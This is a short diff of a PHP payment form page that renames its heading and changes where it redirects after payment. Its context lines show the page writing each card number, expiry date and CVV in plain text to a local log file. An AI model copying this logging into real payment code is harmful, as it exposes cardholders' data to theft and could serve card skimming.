@@ -14,7 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $paymentDetails = "Username: $username, Card Number: $cardNumber, Expiry Date: $expiryMonth/$expiryYear, CVV: $cvv";
     file_put_contents('payments.log', $paymentDetails . PHP_EOL, FILE_APPEND);
     echo 'Payment Successful';
-    header("Location: ./test");
+    header("Location: ./printFacture");
 }
 ?>
 <!DOCTYPE html>
@@ -35,7 +35,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <!-- For demo purpose -->
         <div class="row mb-4">
             <div class="col-lg-8 mx-auto text-center">
-                <h1 class="display-6">Bootstrap Payment Forms</h1>
+                <h1 class="display-6">Payment Forms</h1>
             </div>
         </div> <!-- End -->
         <div class="row">
